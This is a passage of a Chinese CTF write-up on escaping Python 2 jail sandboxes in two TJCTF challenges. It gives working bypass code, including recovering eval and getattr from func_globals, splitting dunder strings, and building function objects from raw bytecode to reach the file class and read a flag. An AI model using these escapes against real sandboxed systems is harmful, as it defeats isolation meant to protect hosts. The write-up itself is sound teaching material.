<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_globals.keys()</span><br><span class="line">[<span class="string">'PseudoFile'</span>, <span class="string">'code'</span>, <span class="string">'bad'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__file__'</span>, <span class="string">'execfile'</span>, <span class="string">'__package__'</span>, <span class="string">'sys'</span>, <span class="string">'getattr'</span>, <span class="string">'Shell'</span>, <span class="string">'banned'</span>, <span class="string">'InteractiveConsole'</span>, <span class="string">'eval'</span>, <span class="string">'get_flag'</span>, <span class="string">'__name__'</span>, <span class="string">'main'</span>, <span class="string">'__doc__'</span>, <span class="string">'print_function'</span>]</span><br></pre></td></tr></table></figure>



<p>可以看到这个地方有大量有趣的玩意儿. 比如利用 eval, 可以绕过对双下划线的过滤.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = get_flag.func_globals.values()[<span class="number">12</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e(<span class="string">'&#123;&#125;.##class##.##bases##[0]'</span>.replace(<span class="string">'#'</span>, <span class="string">'_'</span>))</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>利用 getattr, 可以直接获取 file object</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtin=locals().values()[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr=get_flag.func_globals.values()[<span class="number">8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr(builtin, <span class="string">'fi'</span><span class="string">'le'</span>)</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>然后就变得和套路题一样了…</p>
<h1 id="The-Abyss"><a href="#The-Abyss" class="headerlink" title="The Abyss"></a>The Abyss</h1><p>这道题没被 patch 之前是很简单的, 直接 <code>reload(locals().values()[0])</code> 重新加载builtin模块, 就能愉快地 import 了. 可惜后来被 patch 了, 难度陡增.(话说上一题其实也 patch 过, 然而并没有什么变化…)</p>
<p>被 patch 以后我看着这道题是非常懵逼的, 没有双下划线, 没有getattr, eval, exec, execfile, reload, input等函数.<br>builtin 也被清理得很彻底, 无从下手大概说的就是这种感觉. <del>于是我就放弃了</del></p>
<p>但后来在写另一道题时, 突然搜到了一篇惊为天人的文章(可谓有心栽花花不开, 无心插柳柳成荫啊).<br><a href="http://pbiernat.blogspot.com/2014/09/bypassing-python-sandbox-by-abusing.html" target="_blank" rel="noopener">bypassing-python-sandbox-by-abusing</a></p>
<p>核心思路是: 既然Python是一门面向对象的语言, 数字是对象, 字符串是对象, 连函数也是对象. 那么, 我们为何不通过直接初始化一个函数对象的方法来构造出一个函数, 从而绕过关键词过滤呢?<br>(有点元编程的赶脚)</p>
<p>首先我们拿出经典的绕过语句, 在本地编写一个函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure>

<p>然后通过 <code>function = type(foo)</code>, 可以拿到 function 类.</p>
<p>看看这个类是怎么实例化的.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: function?</span><br><span class="line">Docstring:</span><br><span class="line">function(code, globals[, name[, argdefs[, closure]]])</span><br><span class="line"></span><br><span class="line">Create a function object from a code object and a dictionary.</span><br><span class="line">The optional name string overrides the name from the code object.</span><br><span class="line">The optional argdefs tuple specifies the default argument values.</span><br><span class="line">The optional closure tuple supplies the bindings for free variables.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure>

<p>可以发现想要实例化这个类我们至少需要两个玩意儿, 一个 code object, 一个 globals(该怎么称呼这玩意儿呢…全局作用域?<br>globals 可以沿用全局的. 那么就只差一个 code object 了.</p>
<p>通过 <code>code = type(foo.func_code)</code> 可以得到一个 code 类, 看看参数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: code?</span><br><span class="line">Docstring:</span><br><span class="line">code(argcount, nlocals, stacksize, flags, codestring, constants, names,</span><br><span class="line">      varnames, filename, name, firstlineno, lnotab[, freevars[, cellvars]])</span><br><span class="line"></span><br><span class="line">Create a code object.  Not for the faint of heart.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure>

<p>wow, 好多参数. 具体含义可以到 <a href="https://docs.python.org/2/reference/datamodel.html看" target="_blank" rel="noopener">https://docs.python.org/2/reference/datamodel.html看</a>.</p>
<p>不过这个地方不必关心这些参数的含义, 我们只要照抄就行了. 先全部打印出来:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: print(</span><br><span class="line">    ...:     foo.__code__.co_argcount,</span><br><span class="line">    ...:     foo.__code__.co_nlocals,</span><br><span class="line">    ...:     foo.__code__.co_stacksize,</span><br><span class="line">    ...:     foo.__code__.co_flags,</span><br><span class="line">    ...:     foo.__code__.co_code,</span><br><span class="line">    ...:     foo.__code__.co_consts,</span><br><span class="line">    ...:     foo.__code__.co_names,</span><br><span class="line">    ...:     foo.__code__.co_varnames,</span><br><span class="line">    ...:     foo.__code__.co_filename,</span><br><span class="line">    ...:     foo.__code__.co_name,</span><br><span class="line">    ...:     foo.__code__.co_firstlineno,</span><br><span class="line">    ...:     foo.__code__.co_lnotab,</span><br><span class="line">    ...:     foo.__code__.co_freevars,</span><br><span class="line">    ...:     foo.__code__.co_cellvars</span><br><span class="line">    ...: )</span><br><span class="line">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="literal">None</span>, <span class="number">0</span>, ()), (<span class="string">'__class__'</span>, <span class="string">'__bases__'</span>, <span class="string">'__subclasses__'</span>), (), <span class="string">'&lt;ipython-input-41-f6de0e4db9a4&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ())</span><br></pre></td></tr></table></figure>

<p>然后进行一些修改以绕过过滤, 就可以开始构造我们的函数了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x <span class="comment"># 获取一个 function 对象</span></span><br><span class="line">function = type(f) <span class="comment"># 获取 function 类</span></span><br><span class="line">code = type(f.func_code) <span class="comment"># 获取 code 类</span></span><br><span class="line">codeobj = code(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="literal">None</span>, <span class="number">0</span>, ()), (<span class="string">'_'</span><span class="string">'_class_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_bases_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_subclasses_'</span><span class="string">'_'</span>), (), <span class="string">'&lt;module&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ()) <span class="comment"># 实例化一个 code 对象</span></span><br><span class="line">foo = function(codeobj, globals()) <span class="comment"># 实例化一个 function 对象</span></span><br><span class="line"><span class="comment"># 现在已经在服务器上建立了一个我们的 foo 函数的拷贝了~</span></span><br></pre></td></tr></table></figure>

<p>然后执行 <code>foo()</code>, 就能获得大量棒棒的类.</p>
<p>试着执行 <code>fooo()[40]</code> , 果不其然得到了 file 类. 可以愉快地读取 flag.txt 了~</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>美国的高中生太可怕了…</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="http://storage.aloxaf.cn/storage/Mirror Mirror.py" target="_blank" rel="noopener nofollow">Mirror Mirror.py</a></p>
<p><a href="http://storage.aloxaf.cn/storage/The Abyss.py" target="_blank" rel="noopener nofollow">The Abyss.py</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>原文作者: </span>
      <a href="https://www.aloxaf.com">Aloxaf</a>
    </p>
    <p class="copyright-item">
      <span>原文链接: </span>
      <a href="https://www.aloxaf.com/2018/08/tjctf_pythonjail/">https://www.aloxaf.com/2018/08/tjctf_pythonjail/</a>
    </p>
    <p class="copyright-item">
      <span>许可协议: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/ctf/">ctf</a>
            <a href="/tags/writeup/">writeup</a>
            <a href="/tags/python/">python</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2018/09/reduce_rust_size/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">优化 Rust 程序编译体积</span>
        <span class="prev-text nav-mobile">上一篇</span>
      </a>
    <a class="next" href="/2018/07/java_ugly_font/">
        <span class="next-text nav-default">解决 Arch Linux 下 BurpSuite 打开很丑的问题</span>
        <span class="prev-text nav-mobile">下一篇</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"><div id="vcomments"></div>
    </div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:aloxafx@gmail.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/Aloxaf" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2017 - 2020<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Aloxaf</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
